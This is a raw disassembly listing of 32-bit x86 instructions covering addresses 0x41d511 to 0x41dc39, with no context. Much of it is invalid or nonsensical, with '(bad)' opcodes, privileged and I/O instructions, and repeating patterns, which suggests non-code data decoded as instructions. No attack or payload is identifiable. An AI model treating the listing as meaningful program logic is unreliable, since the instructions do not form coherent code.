  41d511:	xchg   ebx,eax
  41d512:	fsub   QWORD PTR [esi+0x5e2be241]
  41d518:	sar    BYTE PTR [ebx-0x679e8a90],1
  41d51e:	test   BYTE PTR [ebx+0x6f],bh
  41d521:	ror    BYTE PTR [eax+0x0],cl
  41d524:	fisub  DWORD PTR [ebx+0x2e]
  41d527:	cwde   
  41d528:	mov    esi,0x18cc95a7
  41d52d:	nop
  41d52e:	mov    ah,BYTE PTR [edx]
  41d530:	sub    eax,DWORD PTR [eax]
  41d532:	push   edi
  41d533:	fcmovne st,st(7)
  41d535:	fst    DWORD PTR [ebp+ecx*2-0x1b84d054]
  41d53c:	call   0x94eaaba2
  41d541:	sub    al,cl
  41d543:	push   ds
  41d544:	mov    bh,0xbb
  41d546:	sub    BYTE PTR [ebx-0x10863300],dh
  41d54c:	adc    eax,eax
  41d54e:	mov    bh,0x3b
  41d550:	sbb    DWORD PTR [ecx-0x59f9d5a2],edx
  41d556:	aaa    
  41d557:	popf   
  41d558:	fld    TBYTE PTR [ebp+0x4d]
  41d55b:	dec    ebp
  41d55c:	adc    DWORD PTR [ecx],edi
  41d55e:	mov    ebp,0x8956203d
  41d563:	aad    0xa8
  41d565:	sub    al,0x85
  41d567:	in     al,dx
  41d568:	cmp    dh,ch
  41d56a:	push   0x2db022eb
  41d56f:	push   ds
  41d570:	inc    ebp
  41d571:	cs or  ecx,ebx
  41d574:	pop    ecx
  41d575:	dec    ecx
  41d576:	pop    eax
  41d577:	fld    TBYTE PTR [eax-0x6370d842]
  41d57d:	mov    bh,0xf2
  41d57f:	jb     0x41d5ed
  41d581:	jmp    0x41d5d4
  41d583:	call   0xf5d8d6b2
  41d588:	jmp    0x41d518
  41d58a:	push   0xffffffb6
  41d58c:	xlat   BYTE PTR ds:[ebx]
  41d58d:	inc    esi
  41d58e:	fisttp WORD PTR [ebx+0x7b47f81]
  41d594:	adc    BYTE PTR [edx+0x5a],0x51
  41d598:	dec    ebp
  41d599:	adc    esi,ecx
  41d59b:	into   
  41d59c:	shl    BYTE PTR [esi],cl
  41d59e:	dec    edi
  41d59f:	fs pop ecx
  41d5a1:	and    eax,0xd9e095d5
  41d5a6:	add    al,0xf
  41d5a8:	dec    ebp
  41d5a9:	dec    edx
  41d5aa:	pop    esp
  41d5ab:	loop   0x41d53e
  41d5ad:	iret   
  41d5ae:	fstp   QWORD PTR [esi]
  41d5b0:	inc    eax
  41d5b1:	sar    DWORD PTR [esi+0x4d],0x6e
  41d5b5:	jge    0x41d568
  41d5b7:	popa   
  41d5b8:	lock fs adc al,0xd
  41d5bc:	mov    ah,0x18
  41d5be:	sub    BYTE PTR [ebp+0x7d],cl
  41d5c1:	dec    esp
  41d5c2:	push   eax
  41d5c3:	push   eax
  41d5c4:	lods   al,BYTE PTR ds:[esi]
  41d5c5:	xor    al,0xdd
  41d5c7:	jae    0x41d571
  41d5c9:	push   esp
  41d5ca:	pop    eax
  41d5cb:	pop    eax
  41d5cc:	imul   ebx,DWORD PTR [eax+0x171054d5],0x23
  41d5d3:	adc    DWORD PTR [ecx],ecx
  41d5d5:	adc    BYTE PTR ds:0x68521401,al
  41d5db:	enter  0x3a37,0xcf
  41d5df:	jae    0x41d5c5
  41d5e1:	mov    edi,0x96d8e01e
  41d5e6:	inc    esi
  41d5e7:	nop
  41d5e8:	in     al,0x18
  41d5ea:	hlt    
  41d5eb:	popf   
  41d5ec:	scas   al,BYTE PTR es:[edi]
  41d5ed:	jmp    0x65a:0x37e035f2
  41d5f4:	sbb    eax,0x90ddd973
  41d5f9:	fild   DWORD PTR [edi-0x3a]
  41d5fc:	adc    ebp,edi
  41d5fe:	pop    ds
  41d5ff:	push   ss
  41d600:	or     dl,BYTE PTR [ebx+0x53]
  41d603:	lahf   
  41d604:	inc    ecx
  41d605:	int    0x9c
  41d607:	out    dx,eax
  41d608:	mov    ds:0xa63ad9b2,eax
  41d60d:	sbb    BYTE PTR [edx+0x7a],bh
  41d610:	xchg   ecx,eax
  41d611:	fmul   DWORD PTR [ebx+0x75eceacb]
  41d617:	aad    0x5f
  41d619:	cs nop
  41d61b:	cli    
  41d61c:	dec    ebx
  41d61d:	inc    esi
  41d61e:	mov    al,ds:0x9a521d6b
  41d623:	pushf  
  41d624:	jmp    0x3153:0xc6a26c74
  41d62b:	mov    ebp,0x7d1810a
  41d630:	js     0x41d62b
  41d632:	pop    ss
  41d633:	test   DWORD PTR [edi+edi*4],edi
  41d636:	mov    al,ds:0x940206b3
  41d63b:	dec    dh
  41d63d:	ret    0xb191
  41d640:	and    DWORD PTR [edi],esi
  41d642:	or     edi,DWORD PTR [edx+0x1b]
  41d645:	psadbw mm0,mm2
  41d648:	push   ebx
  41d649:	mov    DWORD PTR [edx-0x6b],esp
  41d64c:	mov    ?,esi
  41d64e:	or     ecx,DWORD PTR [esi+0x19]
  41d651:	(bad)  
  41d652:	repz jbe 0x41d6ad
  41d655:	xchg   edi,eax
  41d656:	xor    ebx,DWORD PTR [ebx-0x4f]
  41d659:	jno    0x41d5f8
  41d65b:	cmc    
  41d65c:	inc    edx
  41d65d:	mov    BYTE PTR [edx-0x2f],al
  41d660:	push   ss
  41d661:	fwait
  41d662:	repnz and eax,esi
  41d665:	gs test eax,0xb441212b
  41d66b:	or     ebx,ebp
  41d66d:	inc    edx
  41d66e:	leave  
  41d66f:	ret    
  41d670:	inc    edi
  41d671:	add    BYTE PTR [edx],cl
  41d673:	xchg   BYTE PTR [ebp-0xb9adb8c],al
  41d679:	cld    
  41d67a:	(bad)  
  41d67b:	dec    edx
  41d67c:	(bad)  
  41d67d:	loope  0x41d6a3
  41d67f:	fisubr WORD PTR [edx]
  41d681:	cmp    edx,DWORD PTR [edi]
  41d683:	xchg   edi,eax
  41d684:	xchg   esi,eax
  41d685:	aaa    
  41d686:	cmp    eax,0xad970df8
  41d68b:	jle    0x41d6d7
  41d68d:	sti    
  41d68e:	pop    ss
  41d68f:	icebp  
  41d690:	stos   BYTE PTR es:[edi],al
  41d691:	hlt    
  41d692:	sbb    esp,DWORD PTR [esp+ebp*1+0x6d]
  41d696:	in     eax,dx
  41d697:	add    esi,DWORD PTR [eax]
  41d699:	out    0x31,eax
  41d69b:	jge    0x41d6db
  41d69d:	sahf   
  41d69e:	in     eax,dx
  41d69f:	pop    ds
  41d6a0:	loope  0x41d660
  41d6a2:	popa   
  41d6a3:	in     eax,0x96
  41d6a5:	jns    0x41d70d
  41d6a7:	jle    0x41d651
  41d6a9:	out    dx,al
  41d6aa:	mov    edi,0x536af38d
  41d6af:	mov    ecx,0x51bebac
  41d6b4:	adc    eax,0xd1cb0b8c
  41d6b9:	(bad)  
  41d6ba:	mov    edx,0x6a419d3d
  41d6bf:	dec    ebx
  41d6c0:	shl    BYTE PTR ss:[edi+0x5a],1
  41d6c4:	lahf   
  41d6c5:	test   BYTE PTR [edx-0x11876725],ah
  41d6cb:	cmp    ch,bl
  41d6cd:	or     DWORD PTR [eax+0x8],ecx
  41d6d0:	push   eax
  41d6d1:	stc    
  41d6d2:	stc    
  41d6d3:	sbb    eax,0x83c8133b
  41d6d8:	scas   al,BYTE PTR es:[edi]
  41d6d9:	cdq    
  41d6da:	lahf   
  41d6db:	ins    BYTE PTR es:[edi],dx
  41d6dc:	xchg   edi,eax
  41d6dd:	imul   ebx,eax,0x70669cf6
  41d6e3:	jo     0x41d671
  41d6e5:	jo     0x41d75b
  41d6e7:	je     0x41d671
  41d6e9:	je     0x41d763
  41d6eb:	js     0x41d671
  41d6ed:	js     0x41d76b
  41d6ef:	jl     0x41d671
  41d6f1:	jl     0x41d673
  41d6f3:	cmp    BYTE PTR [eax+eax*4-0x7c],0x84
  41d6f8:	js     0x41d67e
  41d6fa:	mov    BYTE PTR [eax-0x7373778c],cl
  41d700:	jo     0x41d68e
  41d702:	nop
  41d703:	nop
  41d704:	ins    BYTE PTR es:[edi],dx
  41d705:	nop
  41d706:	xchg   esp,eax
  41d707:	xchg   esp,eax
  41d708:	push   0x64989894
  41d70d:	cwde   
  41d70e:	pushf  
  41d70f:	pushf  
  41d710:	pusha  
  41d711:	pushf  
  41d712:	mov    al,ds:0xa4a05ca0
  41d717:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d718:	pop    eax
  41d719:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d71a:	test   al,0xa8
  41d71c:	push   esp
  41d71d:	test   al,0xac
  41d71f:	lods   al,BYTE PTR ds:[esi]
  41d720:	push   eax
  41d721:	lods   al,BYTE PTR ds:[esi]
  41d722:	mov    al,0xb0
  41d724:	dec    esp
  41d725:	mov    al,0xb4
  41d727:	mov    ah,0x48
  41d729:	mov    ah,0xb8
  41d72b:	mov    eax,0xbcbcb844
  41d730:	inc    eax
  41d731:	mov    esp,0xc03cc0c0
  41d736:	(bad)  
  41d737:	les    edi,FWORD PTR [eax]
  41d739:	(bad)  
  41d73a:	enter  0x34c8,0xc8
  41d73e:	int3   
  41d73f:	int3   
  41d740:	xor    ah,cl
  41d742:	rcl    al,1
  41d744:	sub    al,0xd0
  41d746:	aam    0xd4
  41d748:	sub    ah,dl
  41d74a:	fcomp  st(0)
  41d74c:	and    al,0xd8
  41d74e:	(bad)  
  41d750:	and    ah,bl
  41d752:	loopne 0x41d734
  41d754:	sbb    al,0xe0
  41d756:	in     al,0xe4
  41d758:	sbb    ah,ah
  41d75a:	call   0xed29ec47
  41d75f:	in     al,dx
  41d760:	adc    ah,ch
  41d762:	lock lock or al,0xf0
  41d766:	hlt    
  41d767:	hlt    
  41d768:	or     ah,dh
  41d76a:	clc    
  41d76b:	clc    
  41d76c:	add    al,0xf8
  41d76e:	cld    
  41d76f:	cld    
  41d770:	add    ah,bh
  41d772:	add    BYTE PTR [eax],al
  41d774:	cld    
  41d775:	add    BYTE PTR [esp+eax*1],al
  41d778:	clc    
  41d779:	add    al,0x8
  41d77b:	or     ah,dh
  41d77d:	or     BYTE PTR [esp+ecx*1],cl
  41d780:	lock or al,0x10
  41d783:	adc    ah,ch
  41d785:	adc    BYTE PTR [esp+edx*1],dl
  41d788:	call   0xe459efa1
  41d78d:	sbb    BYTE PTR [esp+ebx*1],bl
  41d790:	loopne 0x41d7ae
  41d792:	and    BYTE PTR [eax],ah
  41d794:	fsub   QWORD PTR [eax]
  41d796:	and    al,0x24
  41d798:	fsub   DWORD PTR [eax+ebp*1]
  41d79b:	sub    ah,dl
  41d79d:	sub    BYTE PTR [esp+ebp*1],ch
  41d7a0:	shr    BYTE PTR [eax+esi*1],1
  41d7a3:	xor    ah,cl
  41d7a5:	xor    BYTE PTR [esp+esi*1],dh
  41d7a8:	enter  0x3834,0x38
  41d7ac:	les    edi,FWORD PTR [eax]
  41d7ae:	cmp    al,0x3c
  41d7b0:	sar    BYTE PTR [eax+eax*2],0x40
  41d7b4:	mov    esp,0xb8444440
  41d7b9:	inc    esp
  41d7ba:	dec    eax
  41d7bb:	dec    eax
  41d7bc:	mov    ah,0x48
  41d7be:	dec    esp
  41d7bf:	dec    esp
  41d7c0:	mov    al,0x4c
  41d7c2:	push   eax
  41d7c3:	push   eax
  41d7c4:	lods   al,BYTE PTR ds:[esi]
  41d7c5:	push   eax
  41d7c6:	push   esp
  41d7c7:	push   esp
  41d7c8:	test   al,0x54
  41d7ca:	pop    eax
  41d7cb:	pop    eax
  41d7cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d7cd:	pop    eax
  41d7ce:	pop    esp
  41d7cf:	pop    esp
  41d7d0:	mov    al,ds:0x9c60605c
  41d7d5:	pusha  
  41d7d6:	fs fs cwde 
  41d7d9:	fs push 0x6c689468
  41d7df:	ins    BYTE PTR es:[edi],dx
  41d7e0:	nop
  41d7e1:	ins    BYTE PTR es:[edi],dx
  41d7e2:	jo     0x41d854
  41d7e4:	mov    WORD PTR [eax+0x74],?
  41d7e7:	je     0x41d771
  41d7e9:	je     0x41d863
  41d7eb:	js     0x41d771
  41d7ed:	js     0x41d86b
  41d7ef:	jl     0x41d771
  41d7f1:	jl     0x41d773
  41d7f3:	cmp    BYTE PTR [eax+eax*4-0x7c],0x84
  41d7f8:	js     0x41d77e
  41d7fa:	mov    BYTE PTR [eax-0x7373778c],cl
  41d800:	jo     0x41d78e
  41d802:	nop
  41d803:	nop
  41d804:	ins    BYTE PTR es:[edi],dx
  41d805:	nop
  41d806:	xchg   esp,eax
  41d807:	xchg   esp,eax
  41d808:	push   0x64989894
  41d80d:	cwde   
  41d80e:	pushf  
  41d80f:	pushf  
  41d810:	pusha  
  41d811:	pushf  
  41d812:	mov    al,ds:0xa4a05ca0
  41d817:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d818:	pop    eax
  41d819:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d81a:	test   al,0xa8
  41d81c:	push   esp
  41d81d:	test   al,0xac
  41d81f:	lods   al,BYTE PTR ds:[esi]
  41d820:	push   eax
  41d821:	lods   al,BYTE PTR ds:[esi]
  41d822:	mov    al,0xb0
  41d824:	dec    esp
  41d825:	mov    al,0xb4
  41d827:	mov    ah,0x48
  41d829:	mov    ah,0xb8
  41d82b:	mov    eax,0xbcbcb844
  41d830:	inc    eax
  41d831:	mov    esp,0xc03cc0c0
  41d836:	(bad)  
  41d837:	les    edi,FWORD PTR [eax]
  41d839:	(bad)  
  41d83a:	enter  0x34c8,0xc8
  41d83e:	int3   
  41d83f:	int3   
  41d840:	xor    ah,cl
  41d842:	rcl    al,1
  41d844:	sub    al,0xd0
  41d846:	aam    0xd4
  41d848:	sub    ah,dl
  41d84a:	fcomp  st(0)
  41d84c:	and    al,0xd8
  41d84e:	(bad)  
  41d850:	and    ah,bl
  41d852:	loopne 0x41d834
  41d854:	sbb    al,0xe0
  41d856:	in     al,0xe4
  41d858:	sbb    ah,ah
  41d85a:	call   0xed29ed47
  41d85f:	in     al,dx
  41d860:	adc    ah,ch
  41d862:	lock lock or al,0xf0
  41d866:	hlt    
  41d867:	hlt    
  41d868:	or     ah,dh
  41d86a:	clc    
  41d86b:	clc    
  41d86c:	add    al,0xf8
  41d86e:	cld    
  41d86f:	cld    
  41d870:	add    ah,bh
  41d872:	add    BYTE PTR [eax],al
  41d874:	cld    
  41d875:	add    BYTE PTR [esp+eax*1],al
  41d878:	clc    
  41d879:	add    al,0x8
  41d87b:	or     ah,dh
  41d87d:	or     BYTE PTR [esp+ecx*1],cl
  41d880:	push   cs
  41d881:	or     al,0x13
  41d883:	adc    ah,ch
  41d885:	adc    BYTE PTR [esp+edx*1],dh
  41d888:	call   0xe459ef21
  41d88d:	sbb    ah,bl
  41d88f:	sbb    al,0xe0
  41d891:	pushf  
  41d892:	and    BYTE PTR [eax],ah
  41d894:	fsub   QWORD PTR [eax]
  41d896:	and    al,0x24
  41d898:	fsub   DWORD PTR [eax+ebp*1]
  41d89b:	sub    ah,dl
  41d89d:	sub    BYTE PTR [esp+ebp*1],ch
  41d8a0:	das    
  41d8a1:	sub    al,0x31
  41d8a3:	xor    ah,cl
  41d8a5:	xor    BYTE PTR [esp+esi*1-0x38],bh
  41d8a9:	mov    ah,0x3a
  41d8ab:	cmp    ah,al
  41d8ad:	cmp    BYTE PTR [esp+edi*1-0x40],cl
  41d8b1:	mov    esp,0x40bc4043
  41d8b6:	fadd   QWORD PTR [eax+edi*4-0x3c]
  41d8ba:	dec    eax
  41d8bb:	dec    eax
  41d8bc:	mov    ah,0x48
  41d8be:	dec    esp
  41d8bf:	dec    esp
  41d8c0:	mov    al,0x4c
  41d8c2:	push   eax
  41d8c3:	push   eax
  41d8c4:	lods   al,BYTE PTR ds:[esi]
  41d8c5:	push   eax
  41d8c6:	push   esp
  41d8c7:	push   esp
  41d8c8:	test   eax,0xa45c5154
  41d8cd:	pop    eax
  41d8ce:	cmp    al,0x5c
  41d8d0:	mov    al,ds:0x6353605c
  41d8d5:	pusha  
  41d8d6:	mov    WORD PTR [esi-0x68],fs
  41d8d9:	fs push 0x6c689468
  41d8df:	ins    BYTE PTR es:[edi],dx
  41d8e0:	nop
  41d8e1:	ins    BYTE PTR es:[edi],dx
  41d8e2:	jo     0x41d954
  41d8e4:	mov    WORD PTR [eax+0x74],?
  41d8e7:	je     0x41d871
  41d8e9:	je     0x41d963
  41d8eb:	js     0x41d871
  41d8ed:	js     0x41d96b
  41d8ef:	jl     0x41d872
  41d8f1:	jl     0x41d87c
  41d8f3:	test   BYTE PTR [eax+eax*4+0xc],bh
  41d8f7:	test   BYTE PTR [eax-0x7c],bh
  41d8fa:	pusha  
  41d8fb:	mov    ebp,0x8424888b
  41d900:	jo     0x41d88e
  41d902:	nop
  41d903:	nop
  41d904:	ins    BYTE PTR es:[edi],dx
  41d905:	nop
  41d906:	xchg   esp,eax
  41d907:	xchg   esp,eax
  41d908:	push   0x64989894
  41d90d:	cwde   
  41d90e:	pushf  
  41d90f:	pushf  
  41d910:	pusha  
  41d911:	pushf  
  41d912:	mov    al,ds:0xa4a05ca0
  41d917:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d918:	pop    ecx
  41d919:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d91a:	mov    eax,ds:0x1ca854ac
  41d91f:	lods   al,BYTE PTR ds:[esi]
  41d920:	push   eax
  41d921:	lods   al,BYTE PTR ds:[esi]
  41d922:	and    BYTE PTR [ebx+esi*4+0x48a41cb0],cl
  41d929:	mov    ah,0xb8
  41d92b:	mov    eax,0xbcbcb844
  41d930:	inc    eax
  41d931:	mov    esp,0xc03cc0c0
  41d936:	(bad)  
  41d937:	les    edi,FWORD PTR [eax]
  41d939:	(bad)  
  41d93a:	enter  0x34c8,0xc8
  41d93e:	int3   
  41d93f:	int3   
  41d940:	xor    esp,ecx
  41d942:	mov    ebx,0xcd02cd0
  41d947:	aam    0x28
  41d949:	push   esp
  41d94a:	fcomp  st(0)
  41d94c:	and    al,0xd8
  41d94e:	(bad)  
  41d950:	and    ah,bl
  41d952:	loopne 0x41d934
  41d954:	sbb    al,0xe0
  41d956:	in     al,0xe4
  41d958:	sbb    esp,esp
  41d95a:	loope  0x41d948
  41d95c:	adc    al,0xe8
  41d95e:	sbb    al,0xec
  41d960:	adc    ah,ch
  41d962:	enter  0xf3bf,0xf0
  41d966:	(bad)  
  41d967:	hlt    
  41d968:	or     ah,dh
  41d96a:	clc    
  41d96b:	clc    
  41d96c:	add    al,0xf8
  41d96e:	cld    
  41d96f:	cld    
  41d970:	add    ah,bh
  41d972:	sub    BYTE PTR [eax],al
  41d974:	cld    
  41d975:	add    BYTE PTR [esp+eax*1],ah
  41d978:	clc    
  41d979:	add    al,0x48
  41d97b:	or     ah,dh
  41d97d:	or     BYTE PTR ds:0x100c0c0c,cl
  41d983:	adc    ah,ch
  41d985:	adc    BYTE PTR [esi+edx*1],dl
  41d988:	call   0xe459f1a1
  41d98d:	sbb    BYTE PTR [esp+ebx*1],bl
  41d990:	loopne 0x41d9ae
  41d992:	and    BYTE PTR [eax],ah
  41d994:	fsub   QWORD PTR [eax]
  41d996:	and    al,0x24
  41d998:	fsub   DWORD PTR [eax+ebp*1]
  41d99b:	sub    ah,dl
  41d99d:	sub    BYTE PTR [esp+ebp*1],ch
  41d9a0:	push   eax
  41d9a1:	sub    al,0x30
  41d9a3:	mov    al,0xcc
  41d9a5:	xor    BYTE PTR [esp+esi*4],dh
  41d9a8:	dec    eax
  41d9a9:	xor    al,0xb8
  41d9ab:	cmp    ah,al
  41d9ad:	cmp    BYTE PTR [esp+edi*1-0x3f3fc3c0],bh
  41d9b4:	mov    esp,0x38c4c440
  41d9b9:	inc    esp
  41d9ba:	mov    BYTE PTR [eax+0x4c4c48f4],cl
  41d9c0:	mov    bl,0x4c
  41d9c2:	push   eax
  41d9c3:	push   ecx
  41d9c4:	lods   al,BYTE PTR ds:[esi]
  41d9c5:	push   eax
  41d9c6:	push   esp
  41d9c7:	push   ebp
  41d9c8:	stos   DWORD PTR es:[edi],eax
  41d9c9:	push   esp
  41d9ca:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d9cb:	pop    eax
  41d9cc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d9cd:	pop    eax
  41d9ce:	mov    ds:0x9f5ca35c,eax
  41d9d3:	popa   
  41d9d4:	pushf  
  41d9d5:	pusha  
  41d9d6:	gs fwait
  41d9d8:	fwait
  41d9d9:	fs push 0x93699779
  41d9df:	ins    DWORD PTR es:[edi],dx
  41d9e0:	xchg   ebx,eax
  41d9e1:	ins    DWORD PTR es:[edi],dx
  41d9e2:	(bad)  
  41d9e3:	jno    0x41d974
  41d9e5:	jno    0x41d972
  41d9e7:	jne    0x41d981
  41d9e9:	je     0x41da63
  41d9eb:	imul   eax,DWORD PTR [edi-0x7c827c87],0x7f817f7d
  41d9f5:	cmp    DWORD PTR [ebx-0x7b],0x99888468
  41d9fc:	jg     0x41d9ef
  41d9fe:	sti    
  41d9ff:	cmc    
  41da00:	sti    
  41da01:	cmc    
  41da02:	out    0xe9,eax
  41da04:	out    0xe9,eax
  41da06:	jecxz  0x41da1d
  41da08:	js     0x41d99e
  41da0a:	cwde   
  41da0b:	mov    DWORD PTR [edi-0x1f],ebp
  41da0e:	jmp    0x41d9f5
  41da10:	jmp    0x41d9f7
  41da12:	xlat   BYTE PTR ds:[ebx]
  41da13:	(bad)  
  41da15:	(bad)  
  41da17:	and    eax,0xb9a8a448
  41da1c:	pop    edi
  41da1d:	rcr    ebx,1
  41da1f:	aad    0xdb
  41da21:	aad    0xc7
  41da23:	leave  
  41da24:	(bad)  
  41da25:	leave  
  41da26:	ret    
  41da27:	xor    eax,0xa9b8b458
  41da2c:	dec    edi
  41da2d:	rol    DWORD PTR [ebx-0x43],0x43
  41da31:	lds    esi,FWORD PTR [edi-0x4c3ec03f]
  41da37:	inc    ebp
  41da38:	sub    ah,al
  41da3a:	enter  0x3fd9,0xb1
  41da3e:	xor    ecx,ebp
  41da40:	xor    esi,DWORD PTR [ebp-0x2ed02e59]
  41da46:	mov    ds:0xd8d43855,eax
  41da4b:	leave  
  41da4c:	das    
  41da4d:	mov    eax,ds:0xa523dd23
  41da52:	xchg   edi,eax
  41da53:	loope  0x41da74
  41da55:	loope  0x41d9ea
  41da57:	gs or  ah,ah
  41da5a:	call   0x13d2fa58
  41da5f:	in     eax,dx
  41da60:	adc    edx,DWORD PTR [ebp-0xef00e79]
  41da66:	xor    DWORD PTR [ebp+0x18],0xfffffff4
  41da6a:	clc    
  41da6b:	jmp    0xfd455b7f
  41da70:	add    eax,DWORD PTR [ebp+0x1ff0177]
  41da76:	jae    0x41d9fd
  41da78:	call   0xff5ae281
  41da7d:	jno    0x41da72
  41da7f:	or     eax,0x116775f3
  41da84:	out    dx,eax
  41da85:	adc    DWORD PTR [ebx-0x6b],esp
  41da88:	clc    
  41da89:	adc    al,0x18
  41da8b:	or     edi,ebp
  41da8d:	popa   
  41da8e:	imul   esp,DWORD PTR [ebp+0x6b],0x65
  41da92:	push   edi
  41da93:	pop    ecx
  41da94:	push   edi
  41da95:	pop    ecx
  41da96:	push   ebx
  41da97:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41da98:	enter  0x2824,0x39
  41da9c:	fist   WORD PTR [ecx+0x5b]
  41da9f:	push   ebp
  41daa0:	pop    ebx
  41daa1:	push   ebp
  41daa2:	inc    edi
  41daa3:	dec    ecx
  41daa4:	inc    edi
  41daa5:	dec    ecx
  41daa6:	inc    ebx
  41daa7:	mov    ch,0xd8
  41daa9:	xor    al,0x38
  41daab:	sub    edi,ecx
  41daad:	inc    ecx
  41daae:	dec    ebx
  41daaf:	inc    ebp
  41dab0:	dec    ebx
  41dab1:	inc    ebp
  41dab2:	aaa    
  41dab3:	cmp    DWORD PTR [edi],esi
  41dab5:	cmp    DWORD PTR [ebx],esi
  41dab7:	lds    ebp,FWORD PTR [eax-0x40a6b7bc]
  41dabd:	xor    DWORD PTR [ebx+0x2735b34d],esi
  41dac3:	push   ecx
  41dac4:	scas   eax,DWORD PTR es:[edi]
  41dac5:	push   ecx
  41dac6:	and    edx,ebp
  41dac8:	mov    eax,0xaf495854
  41dacd:	and    DWORD PTR [ebx+0x1725a35d],esp
  41dad3:	popa   
  41dad4:	lahf   
  41dad5:	popa   
  41dad6:	adc    esp,ebp
  41dad8:	mov    BYTE PTR [eax+ebp*2+0x79],ah
  41dadc:	lahf   
  41dadd:	adc    DWORD PTR [ebx+0x715936d],edx
  41dae3:	jno    0x41da74
  41dae5:	jno    0x41daea
  41dae7:	cmc    
  41dae8:	cwde   
  41dae9:	je     0x41db63
  41daeb:	imul   ecx,DWORD PTR [edi-0x7c827cff],0x7f81f705
  41daf5:	xor    ebx,0x88846805
  41dafb:	cdq    
  41dafc:	jg     0x41daef
  41dafe:	jae    0x41da8d
  41db00:	jae    0x41daf7
  41db02:	out    0x91,eax
  41db04:	outs   dx,DWORD PTR ds:[esi]
  41db05:	xchg   ecx,eax
  41db06:	jecxz  0x41db1d
  41db08:	js     0x41da9e
  41db0a:	cwde   
  41db0b:	mov    DWORD PTR [edi-0x1f],ebp
  41db0e:	arpl   WORD PTR [ebp-0x5e281a9d],bx
  41db14:	pop    edi
  41db15:	mov    eax,ds:0xa44825d3
  41db1a:	test   al,0xb9
  41db1c:	pop    edi
  41db1d:	rcr    ebx,1
  41db1f:	aad    0xdb
  41db21:	aad    0xc7
  41db23:	leave  
  41db24:	(bad)  
  41db25:	leave  
  41db26:	ret    
  41db27:	xor    eax,0xa9b8b458
  41db2c:	dec    edi
  41db2d:	ror    ebx,0xc5
  41db30:	retf   
  41db31:	lds    esi,FWORD PTR [edi-0x4c464847]
  41db37:	inc    ebp
  41db38:	sub    ah,al
  41db3a:	enter  0x3fd9,0xb1
  41db3e:	mov    ebx,0xa7b5bbb5
  41db43:	test   eax,0x55a3a9a7
  41db48:	cmp    ah,dl
  41db4a:	fmul   st,st(1)
  41db4c:	daa    
  41db4d:	fldenv [eiz*4-0x66685a55]
  41db54:	xchg   edi,eax
  41db55:	jno    0x41db72
  41db57:	in     eax,0x8
  41db59:	in     al,0xe8
  41db5b:	stc    
  41db5c:	pop    ss
  41db5d:	jmp    0x95dd70fd
  41db62:	xchg   DWORD PTR [ecx-0xaf47679],ecx
  41db68:	sbb    ah,dh
  41db6a:	clc    
  41db6b:	jmp    0x85cd4c77
  41db70:	mov    eax,DWORD PTR [ebp+0x79777977]
  41db76:	jl     0x41db7d
  41db78:	call   0xff4ae381
  41db7d:	jno    0x41dbfa
  41db7f:	jne    0x41dbfc
  41db81:	je     0x41db1a
  41db83:	imul   esp,DWORD PTR [edi+0x69],0x14eb9563
  41db8a:	pop    ss
  41db8b:	sbb    esp,ebp
  41db8d:	popa   
  41db8e:	imul   esp,DWORD PTR [ebp+0x6b],0xffffff9d
  41db92:	xlat   BYTE PTR ds:[ebx]
  41db93:	pop    ecx
  41db94:	push   edi
  41db95:	pop    ecx
  41db96:	push   ebx
  41db97:	mov    ch,0xdb
  41db99:	aam    0x28
  41db9b:	cmp    edi,edx
  41db9d:	sub    DWORD PTR [ebx+0x55],ebx
  41dba0:	pop    ebx
  41dba1:	sub    eax,0x494749cf
  41dba6:	retf   
  41dba7:	xor    eax,0x383834d8
  41dbac:	aaa    
  41dbad:	cmp    ebx,eax
  41dbaf:	mov    ch,0x4b
  41dbb1:	cmp    eax,0x413439bf
  41dbb6:	mov    ebx,0x4844b8b4
  41dbbb:	dec    eax
  41dbbc:	mov    ah,0x48
  41dbbe:	mov    bl,0x4d
  41dbc0:	mov    bl,0xbc
  41dbc2:	pop    edi
  41dbc3:	push   ecx
  41dbc4:	scas   eax,DWORD PTR es:[edi]
  41dbc5:	push   ecx
  41dbc6:	push   esp
  41dbc7:	push   esp
  41dbc8:	test   al,0x54
  41dbca:	pop    eax
  41dbcb:	pop    eax
  41dbcc:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41dbcd:	pop    eax
  41dbce:	pop    esp
  41dbcf:	dec    ebp
  41dbd0:	mov    ds:0x8c616fac,eax
  41dbd5:	pusha  
  41dbd6:	fs fs cwde 
  41dbd9:	mov    BYTE PTR fs:[eax-0x6c],ch
  41dbdd:	popa   
  41dbde:	mov    WORD PTR [eax+edx*4+0x65],gs
  41dbe2:	nop
  41dbe3:	jo     0x41db71
  41dbe5:	jns    0x41db7b
  41dbe7:	je     0x41db71
  41dbe9:	jge    0x41db83
  41dbeb:	js     0x41db71
  41dbed:	jno    0x41db8b
  41dbef:	jl     0x41db71
  41dbf1:	jne    0x41dc53
  41dbf3:	cmp    BYTE PTR [ecx+ecx*4+0x64],0x84
  41dbf8:	js     0x41db87
  41dbfa:	push   0x6c817488
  41dbff:	mov    WORD PTR [eax-0x7b],?
  41dc02:	jo     0x41db94
  41dc04:	ins    BYTE PTR es:[edi],dx
  41dc05:	cdq    
  41dc06:	je     0x41db9c
  41dc08:	push   0x6498789d
  41dc0d:	xchg   ecx,eax
  41dc0e:	jl     0x41dbac
  41dc10:	pusha  
  41dc11:	xchg   ebp,eax
  41dc12:	inc    eax
  41dc13:	mov    al,ds:0xa444a95c
  41dc18:	pop    eax
  41dc19:	lods   eax,DWORD PTR ds:[esi]
  41dc1a:	dec    eax
  41dc1b:	test   al,0x54
  41dc1d:	mov    eax,ds:0xa550ac4c
  41dc22:	push   eax
  41dc23:	mov    al,0x4c
  41dc25:	mov    ecx,0xbd48b454
  41dc2a:	pop    eax
  41dc2b:	mov    eax,0xbc5cb144
  41dc30:	inc    eax
  41dc31:	mov    ch,0x20
  41dc33:	sar    BYTE PTR [ecx+ecx*8],0x24
  41dc37:	les    edi,FWORD PTR [eax]
  41dc39:	int    0x28
